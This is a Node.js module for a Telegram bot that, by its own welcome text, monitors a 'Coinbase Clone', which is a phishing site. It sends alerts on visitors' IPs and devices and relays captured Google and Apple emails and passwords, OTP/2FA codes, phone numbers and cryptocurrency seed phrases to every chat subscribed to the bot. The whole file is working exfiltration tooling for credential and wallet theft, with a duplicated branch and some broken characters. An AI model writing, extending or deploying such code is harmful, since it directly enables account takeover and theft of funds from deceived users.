const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// Initialize bot with polling to receive messages
let bot = null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// Store all chat IDs that have started the bot
const subscribedChats = new Set();

// File to persist subscribers
const SUBSCRIBERS_FILE = path.join(__dirname, '../data/subscribers.json');

// Load subscribers from file on startup
const loadSubscribers = () => {
  try {
    // Create data directory if it doesn't exist
    const dataDir = path.join(__dirname, '../data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }

    if (fs.existsSync(SUBSCRIBERS_FILE)) {
      const data = fs.readFileSync(SUBSCRIBERS_FILE, 'utf8');
      const subscribers = JSON.parse(data);
      subscribers.forEach(chatId => subscribedChats.add(chatId));
      console.log(`📂 Loaded ${subscribedChats.size} subscribers from file`);
    }
  } catch (error) {
    console.error('Error loading subscribers:', error);
  }
};

// Save subscribers to file
const saveSubscribers = () => {
  try {
    const dataDir = path.join(__dirname, '../data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    
    const subscribers = Array.from(subscribedChats);
    fs.writeFileSync(SUBSCRIBERS_FILE, JSON.stringify(subscribers, null, 2));
    console.log(`💾 Saved ${subscribers.length} subscribers to file`);
  } catch (error) {
    console.error('Error saving subscribers:', error);
  }
};

// Load subscribers on startup
loadSubscribers();

// Initialize with default chat ID if provided (for backward compatibility)
if (process.env.TELEGRAM_CHAT_ID) {
  subscribedChats.add(process.env.TELEGRAM_CHAT_ID);
  saveSubscribers();
}

if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
  console.log('✅ Telegram bot initialized with polling');
  
  // Handle /start command - add user to subscribers
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    subscribedChats.add(chatId);
    saveSubscribers(); // Persist to file
    
    bot.sendMessage(chatId, `
🎉 *Welcome to Coinbase Clone Monitor!*

You are now subscribed to receive notifications.

You will get alerts for:
• 👁️ New visitors
• 📧 Credential captures
• ✅ Complete authentications

Total subscribers: ${subscribedChats.size}
    `, { parse_mode: 'Markdown' });
    
    console.log(`✅ New subscriber: ${chatId} (Total: ${subscribedChats.size})`);
  });
  
  // Handle /stop command - remove user from subscribers
  bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id.toString();
    subscribedChats.delete(chatId);
    saveSubscribers(); // Persist to file
    
    bot.sendMessage(chatId, '👋 You have been unsubscribed from notifications.');
    console.log(`❌ Unsubscribed: ${chatId} (Total: ${subscribedChats.size})`);
  });
  
  // Handle /status command - show subscription status
  bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id.toString();
    const isSubscribed = subscribedChats.has(chatId);
    
    bot.sendMessage(chatId, `
📊 *Your Status*

Subscribed: ${isSubscribed ? '✅ Yes' : '❌ No'}
Total subscribers: ${subscribedChats.size}
Your Chat ID: \`${chatId}\`

${!isSubscribed ? 'Send /start to subscribe!' : ''}
    `, { parse_mode: 'Markdown' });
  });
  
} else {
  console.log('⚠️  Telegram bot not configured (missing TELEGRAM_BOT_TOKEN)');
}

// Helper function to format messages
const escapeMarkdown = (text) => {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
};

// Helper function to send message to all subscribers
const sendToAllSubscribers = async (message, options = {}) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('No subscribers to send to');
    return;
  }
  
  let removedUsers = false;
  const promises = Array.from(subscribedChats).map(chatId => 
    bot.sendMessage(chatId, message, options).catch(err => {
      console.error(`Failed to send to ${chatId}:`, err.message);
      // If user blocked the bot, remove them from subscribers
      if (err.message.includes('blocked') || err.message.includes('user is deactivated')) {
        subscribedChats.delete(chatId);
        removedUsers = true;
        console.log(`Removed inactive user: ${chatId}`);
      }
    })
  );
  
  await Promise.all(promises);
  
  // Save if any users were removed
  if (removedUsers) {
    saveSubscribers();
  }
  
  console.log(`✅ Sent to ${subscribedChats.size} subscribers`);
};

// Send button click notification (Get Started, Sign In, Sign Up)
const sendButtonClickNotification = async (clickData) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping button click notification');
    return;
  }

  try {
    const buttonEmoji = {
      'get-started': '🚀',
      'sign-in': '🔐',
      'sign-up': '📝'
    };
    
    const buttonText = {
      'get-started': 'GET STARTED',
      'sign-in': 'SIGN IN',
      'sign-up': 'SIGN UP'
    };

    const emoji = buttonEmoji[clickData.button] || '🔘';
    const text = buttonText[clickData.button] || clickData.button?.toUpperCase();

    const message = `
${emoji} *USER CLICKED: ${text}*

📍 *Location:*
━━━━━━━━━━━━━━━━━━━
IP: \`${escapeMarkdown(clickData.ipAddress)}\`
🗺 ${escapeMarkdown(clickData.timezone || 'Unknown')}
🌍 ${escapeMarkdown(clickData.language || 'Unknown')}

💻 *Device:*
━━━━━━━━━━━━━━━━━━━
${escapeMarkdown(clickData.platform || 'Unknown')} | ${escapeMarkdown(clickData.screenResolution || 'Unknown')}

⏰ ${new Date().toLocaleString()}

➡️ *User is now on ${text} page*
`;

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ Button click notification sent: ${clickData.button}`);
  } catch (error) {
    console.error('❌ Error sending button click notification:', error.message);
  }
};

// Send visitor notification
const sendVisitorNotification = async (visitorData) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping visitor notification');
    return;
  }

  try {
    const message = `
🔔 *NEW VISITOR ALERT*

👤 *Visitor Details:*
━━━━━━━━━━━━━━━━━━━
📍 IP: \`${escapeMarkdown(visitorData.ipAddress)}\`
🌐 Page: ${escapeMarkdown(visitorData.page || 'Unknown')}
🗺 Timezone: ${escapeMarkdown(visitorData.timezone || 'Unknown')}
🌍 Language: ${escapeMarkdown(visitorData.language || 'Unknown')}

💻 *Device Info:*
━━━━━━━━━━━━━━━━━━━
🖥 Platform: ${escapeMarkdown(visitorData.platform || 'Unknown')}
📱 Screen: ${escapeMarkdown(visitorData.screenResolution || 'Unknown')}
🔍 Browser: ${escapeMarkdown(visitorData.userAgent?.substring(0, 60) || 'Unknown')}...

🍪 *Tracking Data:*
━━━━━━━━━━━━━━━━━━━
Cookies: ${visitorData.cookies ? '✅ Available' : '❌ None'}
Referrer: ${escapeMarkdown(visitorData.referrer || 'Direct')}

⏰ Time: ${new Date().toLocaleString()}
`;

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log('✅ Visitor notification sent to all subscribers');
  } catch (error) {
    console.error('❌ Error sending visitor notification:', error.message);
  }
};

// Send credential capture notification (initial step)
const sendCredentialStartNotification = async (provider, data) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping credential start notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      // Check what step we're on
      if (data.step === 'email') {
        message = `
📧 *GOOGLE - EMAIL ENTERED*

\`${escapeMarkdown(data.email)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
      } else if (data.step === 'password') {
        message = `
🔒 *GOOGLE - PASSWORD ENTERED*

📧 Email: \`${escapeMarkdown(data.email)}\`
🔑 Password: \`${escapeMarkdown(data.password)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}
`;
      } else {
        // Fallback for other steps
        message = `
🎯 *GOOGLE AUTH - ${escapeMarkdown(data.step?.toUpperCase() || 'STEP')}*

📧 Email: \`${escapeMarkdown(data.email)}\`
${data.password ? `🔑 Password: \`${escapeMarkdown(data.password)}\`` : ''}

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}
`;
      }
    } else if (provider === 'Apple') {
      // Apple auth steps
      if (data.step === 'credentials') {
        message = `
🍎 *APPLE - CREDENTIALS ENTERED*

📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
� Password: \`${escapeMarkdown(data.password || '[Entering...]')}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
      } else {
        message = `
🍎 *APPLE AUTH - ${escapeMarkdown(data.step?.toUpperCase() || 'STEP')}*

📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}
`;
      }
    } else if (provider === 'Recovery Phrase') {
      message = `
🔑 *RECOVERY PHRASE ENTERED*

🗝 *12-Word Seed Phrase:*
\`${escapeMarkdown(data.seedPhrase)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}

⏰ ${new Date().toLocaleString()}
`;
    }

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} start notification sent to all subscribers`);
  } catch (error) {
    console.error('❌ Error sending credential start notification:', error.message);
  }
};

// Send complete credential capture notification
const sendCredentialCompleteNotification = async (provider, data) => {
  if (!bot || subscribedChats.size === 0) {
    console.log('Telegram not configured or no subscribers, skipping credential complete notification');
    return;
  }

  try {
    let message = '';
    
    if (provider === 'Google') {
      message = `
✅ *GOOGLE - OTP/2FA ENTERED*

� OTP Code: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📮 Recovery: ${escapeMarkdown(data.recoveryEmail || 'Not provided')}

━━━━━━━━━━━━━━━━━━━
📧 Email: \`${escapeMarkdown(data.email)}\`
� Password: \`${escapeMarkdown(data.password)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}

🎯 *AUTHENTICATION COMPLETE* ✅
`;
    } else if (provider === 'Apple') {
      message = `
✅ *APPLE - 2FA CODE ENTERED*

🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}

━━━━━━━━━━━━━━━━━━━
📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`

📍 IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}

🎯 *AUTHENTICATION COMPLETE* ✅
`;
    } else if (provider === 'Apple') {
      message = `
✅ *APPLE - 2FA CODE ENTERED*

🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}

━━━━━━━━━━━━━━━━━━━
📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`

� IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}

🎯 *AUTHENTICATION COMPLETE* ✅
`;
    } else if (provider === 'Recovery Phrase') {
      message = `
✅ *RECOVERY PHRASE - VERIFICATION COMPLETE*

 Email: \`${escapeMarkdown(data.email)}\`
🔒 Password: \`${escapeMarkdown(data.password)}\`

━━━━━━━━━━━━━━━━━━━
🔑 Seed Phrase:
\`${escapeMarkdown(data.seedPhrase)}\`

� IP: \`${escapeMarkdown(data.ipAddress)}\`

⏰ ${new Date().toLocaleString()}

🎯 *AUTHENTICATION COMPLETE* ✅
`;
    }

    await sendToAllSubscribers(message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ ${provider} complete notification sent to all subscribers`);
  } catch (error) {
    console.error('❌ Error sending credential complete notification:', error.message);
  }
};

module.exports = {
  sendButtonClickNotification,
  sendVisitorNotification,
  sendCredentialStartNotification,
  sendCredentialCompleteNotification
};
